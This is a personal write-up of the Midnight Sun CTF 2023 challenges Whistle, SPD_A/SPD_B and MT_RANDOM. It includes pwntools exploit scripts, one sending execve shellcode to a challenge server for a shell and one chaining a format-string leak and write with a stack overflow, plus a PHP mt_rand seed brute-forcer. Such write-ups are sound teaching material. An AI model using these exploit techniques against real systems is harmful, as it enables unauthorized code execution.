# Midnight Sun CTF 2023 Writeup
It's not really our lucky day when we cannot achieve top 30 - 40. My team on 60th rank and we didn't do much problem. But still, i decided to post this writeup to share with you what challenge I have done and how I did that.
Note: Please forgive me if my potato English make you having trouble reading it :) 

### Whistle - MISC
This challenge give us a file compose from G-Code ( a languague in CNC programming i guessed ) . If we run it (online tools), we will get a flag which be redacted - The flag is cover by many "redacted". The first idea came in my mind is to split the file into many part. By this way, it reduce "redacted" cover the flag and we can see the flag easily.
``` flag : midnight{router_hacking?}```

### SPD_A , SPD_B - SPD
SPD_A's solution:
```python
from pwn import *
s = remote('spda-1.play.hfsc.tf', 40001)
#s = process(executable = './spd_a', argv = [])
#s = gdb.debug('./spd_a', gdbscript = 'break *main+727')
payload = b"\x48\x31\xC0\x50\x48\xB8\x2E\x63\x68\x6F\x2E\x2E\x72\x69\x48\xBB\x01\x01\x01\x01\x01\x01\x01\x01\x48\x31\xD8\x50\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x0F\x05"
s.send(payload)
s.interactive()
```

SPD_B's solution ( I solved after CTF end, really sad T_T )
```python
from pwn import *
#s = gdb.debug('./spd_b', gdbscript = 'break *guess+137')
s = process(executable='./spd_b', argv = [])

payload = b"%38$x.%39$x"
s.recvuntil(b"guess: ")
s.sendline(payload)
msg = s.recvuntil(b"is not my number :(").decode()
ebp, addr = msg.replace("is not my number :(", "").split(".")

ebp = int(ebp, 16)
addr = int(addr, 16)
newaddr = addr - 0x1479 + 0x138d
ebp = ebp - 64
print("ebp found:", hex(ebp))
print("win addr found:", hex(newaddr))


payload = "%29477c%40$n"
s.sendline(payload)
s.recvuntil(b"number :(")

payload = b"a"*0x88 + b"aaaa" + p64(newaddr)
s.sendline(payload)
s.interactive()
```

### MT_RANDOM - crypto
The main idea for this problem is to recover MIN, MAX, GAPSTART, GAPEND, after that, it's just a normal bruteforce seed problem. So how can we do that?
If you repeat taking samples, you will notice that the sample sequence has a limit : maximum number is not greater than 256, minimum number is not lower than 1. So right now we have recoverd 2 nunbers. What about the other 2? Well, it's actually easy than you think. We just need to find, from 1 to 256, which number is missing, as the statement 
```php
if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
```
moving all number bigger than GAPSTART to x + GAPEND - GAPSTART, creating a gap in the sequence. The first missing number will be GAPSTART, and the last missing number + 1 will be the GAPEND. One thing to notice that, some number can be randomized by 2 different seed, so to make sure you get the right flag, you have to run it 15 times.
source:
```php
<?php
// Enter your code here, enjoy!
$max = 256;
$min = 1;
$gap_start = 100;
$gap_end = 150;
$sample = [226, 45, 67, 251, 45, 181, 255, 226, 216, 226, 225, 251, 67, 29, 226, 255, 153, 29, 181, 191, 46, 218];

// $array = array("1" => "PHP code tester Sandbox Online",
//     "emoji" => "😀 😃 😄 😁 😆", 5 , 5 => 89009,
//     "Random number" => rand(100,999),
//     "PHP Version" => phpversion()
// );

// foreach( $array as $key => $value ){
//     echo $key."\t=>\t".$value."\n";
// }
function non_continuous_sample($min, $max, $gap_start, $gap_end) {
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

$preflag = [109, 105, 100, 110, 105, 103, 104, 116];
$seed = -1;
for($testseed = 0; $testseed <= 10000; $testseed ++)
{
	$ch = true;
	for($i = 0; $i<8; $i++)
	{
		mt_srand($testseed + $preflag[$i]);
		if (non_continuous_sample($min, $max, $gap_start, $gap_end) != $sample[$i])
		{
			$ch = false;
			break;
		}
	}
	if ($ch)
	{
		$seed = $testseed;
		break;
	}
}
echo $testseed,"\n";
$flag=[];
for($i = 0; $i < 22; $i++)
{
	for($flagchar = 32; $flagchar < 128; $flagchar++)
	{
		mt_srand($seed + $flagchar);
		if (non_continuous_sample($min, $max, $gap_start, $gap_end) == $sample[$i])
		{
			$flag[] = $flagchar;
			break;
		}
	}
}

for($i = 0; $i < 22; $i++)
{
	echo $flag[$i]," ";
}
```